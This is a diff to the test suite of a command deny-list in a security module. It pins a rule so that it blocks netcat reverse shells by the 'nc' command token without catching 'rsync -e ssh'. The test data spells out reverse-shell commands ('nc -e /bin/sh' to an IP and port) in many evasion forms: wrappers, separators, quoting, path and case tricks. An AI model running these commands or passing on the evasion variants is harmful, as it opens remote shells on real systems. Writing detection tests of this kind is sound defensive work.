@@ -413,12 +413,19 @@ class TestSelfProtectionFlagInterposition:
         ungated floor no opt-out can reach -- so there is nothing such a pin could
         force back on. Both spellings must resolve to ``None`` (reported by
         ``_resolved_pin_ids`` as pinning nothing) rather than to an id the
-        catalog cannot display or toggle, and the alias map must stay empty
-        rather than quietly re-acquire an entry for a row that does not exist.
+        catalog cannot display or toggle, and the alias map is pinned to its EXACT
+        contents -- the one prior spelling of ``reverse-shell-nc`` -- so it cannot
+        quietly re-acquire an entry for a deleted row (a ratchet may only
+        tighten); the row that entry names must also EXIST.
         """
         from kiro_crew import security
 
-        assert security._LEGACY_RULE_ID_BY_PATTERN == {}
+        # Exact set, not a per-entry property: an alias for a deleted row (or any
+        # other addition) fails here until this line is changed on purpose.
+        assert security._LEGACY_RULE_ID_BY_PATTERN == {"nc -e" + ".*": "reverse-shell-nc"}
+        live_ids = {r.id for r in BUILTIN_DENIED_RULES}
+        for legacy, rule_id in security._LEGACY_RULE_ID_BY_PATTERN.items():
+            assert rule_id in live_ids, legacy
         for stale in (
             ".*kiro.?crew restart.*",
             ".*kiro.?crew(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+restart.*",
@@ -2555,6 +2562,168 @@ class TestRuleIdentityIsTheId:
         # Passing the PATTERN where an id belongs disables nothing, which is precisely
         # why a pattern edit cannot weaken an existing policy.
         assert compute_effective_denied([rule], {rule.pattern}, False, (), ()) == [rule.pattern]
+
+
+class TestReverseShellNcIsCommandTokenAnchored:
+    """``reverse-shell-nc`` matches the ``nc`` COMMAND TOKEN, not a substring.
+
+    An unanchored substring ``nc -e`` matches inside ``rsync -e ssh``: every
+    rsync-over-ssh transfer with a detached remote-shell flag, and every
+    read-only command that merely quotes the phrase, then reads as a netcat
+    reverse shell.  The row therefore requires ``nc`` to BEGIN a token -- start
+    of input, whitespace, a path separator, a quote or a shell operator before
+    it -- so the tail of another token (``rsync``, ``vnc``) is not a match,
+    while every genuine invocation the bare substring refuses is refused here
+    too.  The sibling ``reverse-shell-ncat`` row keeps its own spelling: each
+    row governs exactly the spelling its toggle names, the same per-row
+    attribution the always-on exfil gate enforces (``test_exfil_gate_opt_out``).
+    """
+
+    _RULE = "reverse-shell-nc"
+    _SIBLING = "reverse-shell-ncat"
+
+    @pytest.fixture(autouse=True)
+    def _remote_rsync_targets_are_not_this_host(self, monkeypatch):
+        # The rsync allow cases name a REMOTE host, which the sandbox-escape floor
+        # judges by resolving it, fail-closed while unresolved.  Pin the own-host
+        # cache and stub the DNS verdict to "not self" exactly as
+        # ``TestSandboxEscapeSshSelf`` does (its fixture says why each slot), so
+        # nothing is resolved for real and the verdict here is this row's alone.
+        own = security.socket.gethostname().strip().lower()
+        pinned = frozenset(name for name in {own, own.split(".", 1)[0]} if name)
+        monkeypatch.setattr(_argv_floor, "_OWN_HOST_NAMES_CACHE", pinned)
+        monkeypatch.setattr(_argv_floor, "_OWN_HOST_RESOLVE_DONE", True)
+        monkeypatch.setattr(_argv_floor, "_NETLINK_ADDRS_PUBLISHED", True)
+        monkeypatch.setattr(_argv_floor, "_resolved_host_verdict", lambda host, **_kw: False)
+
+    @staticmethod
+    def _effective_without(*rule_ids: str) -> list[str]:
+        return compute_effective_denied(BUILTIN_DENIED_RULES, set(rule_ids), False, (), ())
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # bare, and the reporter's own acceptance example
+            "nc -e /bin/sh 10.0.0.1 4444",
+            # the flag glued to its program, as getopt accepts it
+            "nc -e/bin/sh 10.0.0.1 4444",
+            "nc -esh 10.0.0.1 4444",
+            # padded whitespace between the verb and the flag
+            "nc  -e /bin/sh 10.0.0.1 4444",
+            "nc\t-e /bin/sh 10.0.0.1 4444",
+            # path-qualified
+            "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
+            "/bin/nc -e /bin/sh 10.0.0.1 4444",
+            "./nc -e /bin/sh 10.0.0.1 4444",
+            # alias-bypass backslash
+            "\\nc -e /bin/sh 10.0.0.1 4444",
+            # a lone ``=`` before the verb is not an assignment prefix
+            "=nc -e /bin/sh 10.0.0.1 4444",
+            # ``:`` glued to the verb is not a boundary: the Windows drive-relative
+            # spelling, and any other ``:``-glued prefix (no legitimate command
+            # takes that form, so this is fail-safe over-denial)
+            "C:nc -e /bin/sh 10.0.0.1 4444",
+            "scheme:nc -e /bin/sh 10.0.0.1 4444",
+            # after every shell separator, spaced and glued
+            "true; nc -e /bin/sh 10.0.0.1 4444",
+            "true;nc -e /bin/sh 10.0.0.1 4444",
+            "true && nc -e /bin/sh 10.0.0.1 4444",
+            "true&&nc -e /bin/sh 10.0.0.1 4444",
+            "false || nc -e /bin/sh 10.0.0.1 4444",
+            "false||nc -e /bin/sh 10.0.0.1 4444",
+            "echo x | nc -e /bin/sh 10.0.0.1 4444",
+            "echo x|nc -e /bin/sh 10.0.0.1 4444",
+            "(nc -e /bin/sh 10.0.0.1 4444)",
+            "x=$(nc -e /bin/sh 10.0.0.1 4444)",
+            "x=`nc -e /bin/sh 10.0.0.1 4444`",
+            # after a wrapper
+            "sudo nc -e /bin/sh 10.0.0.1 4444",
+            "env FOO=bar nc -e /bin/sh 10.0.0.1 4444",
+            "busybox nc -e /bin/sh 10.0.0.1 4444",
+            "nohup nc -e /bin/sh 10.0.0.1 4444 &",
+            "timeout 30 nc -e /bin/sh 10.0.0.1 4444",
+            # inside a nested shell payload, both quote styles
+            "bash -c 'nc -e /bin/sh 10.0.0.1 4444'",
+            'sh -c "nc -e /bin/sh 10.0.0.1 4444"',
+            # a re-quoted verb reaches the row through the quote-normalized view
+            '"nc" -e /bin/sh 10.0.0.1 4444',
+            # case is folded before matching
+            "NC -E /bin/sh 10.0.0.1 4444",
+        ],
+    )
+    def test_a_genuine_netcat_exec_is_denied_by_this_row(self, cmd):
+        assert _denied_by(cmd) == self._RULE, cmd
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # the reporter's transfer, and the plain detached remote-shell flag
+            (
+                'rsync -e "ssh -F /dev/null -o BatchMode=yes user@far.example.com" '
+                "./file far.example.com:/path"
+            ),
+            "rsync -e ssh user@far.example.com:/remote/path /local/path",
+            "rsync -avz -e 'ssh -p 2222' src/ far.example.com:/dst/",
+            # another program whose name ends in the same two letters
+            "vnc -e /etc/vnc.conf",
+            # a file name ending in the letters, with a flag after it; the second
+            # reaches ``nc -exec`` once pass 2 normalizes the quotes away
+            "python train.py dataset.nc -e 50",
+            "find . -name '*.nc' -exec grep -l x {} +",
+            # an assignment prefix glued to the verb
+            "NAME=nc -e /bin/sh 10.0.0.1 4444",
+            # ``-nc`` as another program's flag, followed by its own ``-e``
+            "wget -r -nc -e robots=off https://example.com",
+            "rsync -nc -e ssh src host:/dst",
+            # the phrase as DATA: a read-only search for it, and a message naming it
+            "grep -rn 'rsync -e' docs/",
+            "git log --oneline --grep='rsync -e'",
+            "git commit -m 'docs: prefer rsync -e ssh over --rsh'",
+        ],
+    )
+    def test_the_substring_inside_another_token_is_not_a_reverse_shell(self, cmd):
+        assert _denied_by(cmd) is None, cmd
+
+    def test_each_row_governs_exactly_its_own_spelling(self):
+        # Mirrors the exfil gate's per-row attribution at the catalog tier: the
+        # anchored ``nc`` row must not shadow ``ncat``, or switching the sibling
+        # off would read as enabled-and-off while enforcement never changed.
+        nc_cmd = "nc -e /bin/sh 10.0.0.1 4444"
+        ncat_cmd = "ncat -e /bin/sh 10.0.0.1 4444"
+        assert _denied_by(ncat_cmd) == self._SIBLING
+        assert is_denied(nc_cmd, denied_regexes=self._effective_without(self._RULE)) is None
+        assert is_denied(ncat_cmd, denied_regexes=self._effective_without(self._SIBLING)) is None
+        assert is_denied(ncat_cmd, denied_regexes=self._effective_without(self._RULE))
+        assert is_denied(nc_cmd, denied_regexes=self._effective_without(self._SIBLING))
+
+    def test_the_row_runs_on_the_full_input_matcher(self):
+        # No top-level ``.*`` gap, so the row is one fragment matched with exact
+        # ``re.search`` over the WHOLE command, never the length-capped scan --
+        # a padded command cannot slip the needle past a bound.
+        from kiro_crew.security import _deny_matcher
+
+        pattern = _rule_pattern(self._RULE)
+        assert is_safe_user_regex(pattern)
+        matcher = _deny_matcher(pattern)
+        assert not matcher._bounded
+        assert len(matcher._frag_res) == 1
+
+    def test_a_governance_pin_in_the_prior_spelling_still_pins_the_row(self):
+        # A governance policy persists the pattern STRING it pinned.  A ceiling or
+        # profile written against the older catalog holds the bare substring, and
+        # a pin that stopped resolving would let a user opt-out drop the row the
+        # administrator pinned -- the legacy alias is what keeps it resolving.
+        legacy = "nc -e" + ".*"
+        assert security._rule_id_for_pattern(legacy) == self._RULE
+        assert security._resolved_pin_ids([legacy], "commands-ceiling-pin") == {self._RULE}
+        # The pinned id re-adds the row past a user disable AND a disable-all,
+        # exactly as a pin in the current spelling does.
+        rule = next(r for r in BUILTIN_DENIED_RULES if r.id == self._RULE)
+        pinned = compute_effective_denied([rule], {rule.id}, True, (), {self._RULE})
+        assert pinned == [rule.pattern]
+        # Lookup-only: the prior spelling is not a built-in and is never enforced.
+        assert legacy not in BUILTIN_DENY_PATTERNS
+        assert legacy not in security._RULE_ID_BY_PATTERN
 
 
 class TestNameAsDataIsNotAnInvocation:
@@ -7882,9 +8051,10 @@ class TestSandboxEscapeSshSelf:
             # rsync ``--rsh`` naming plain ``ssh`` (no self host) is the
             # normal remote-shell selector; ``--exclude`` names data.  (The
             # detached ``-e ssh`` spelling is floor-allowed too -- asserted in
-            # test_rsync_detached_rsh_floor_allows_plain_ssh -- but the
-            # pre-existing ``reverse-shell-nc`` catalog rule substring-matches
-            # ``rsy[nc -e]``, so end-to-end it is denied by that older rule.)
+            # test_rsync_detached_rsh_floor_allows_plain_ssh -- and, because the
+            # ``reverse-shell-nc`` row is anchored to the ``nc`` command token,
+            # allowed end-to-end as well; pinned by
+            # TestReverseShellNcIsCommandTokenAnchored.)
             "rsync --rsh=ssh /tmp/f far.example.com:/p",
             "rsync --exclude=localhost /tmp/f far.example.com:/p",
             # A leading ``RSYNC_RSH`` naming a REMOTE shell target is the
@@ -7957,11 +8127,13 @@ class TestSandboxEscapeSshSelf:
         assert not spawned, "the DNS-enrichment daemon thread was spawned during the floor scan"
 
     def test_rsync_detached_rsh_floor_allows_plain_ssh(self):
-        # THIS floor must not deny the normal detached remote-shell selector;
-        # the end-to-end deny of this string comes from the unrelated
-        # ``reverse-shell-nc`` catalog rule (unanchored ``nc -e.*`` matching
-        # inside ``rsync -e``), which predates this change.
-        assert not security._is_ssh_to_self("rsync " + "-e ssh /tmp/f far.example.com:/p")
+        # THIS floor must not deny the normal detached remote-shell selector, and
+        # neither does the ``reverse-shell-nc`` catalog row: it is anchored to the
+        # ``nc`` command token, so the letters ``nc -e`` inside ``rsync -e`` are not
+        # a match.  Pinned end-to-end here as well as at the floor.
+        cmd = "rsync " + "-e ssh /tmp/f far.example.com:/p"
+        assert not security._is_ssh_to_self(cmd)
+        assert _denied_by(cmd) is None
 
     def test_mask_quoted_separators_round_trip(self):
         # The mask rewrites only QUOTED / backslash-escaped ``;``/``|`` to
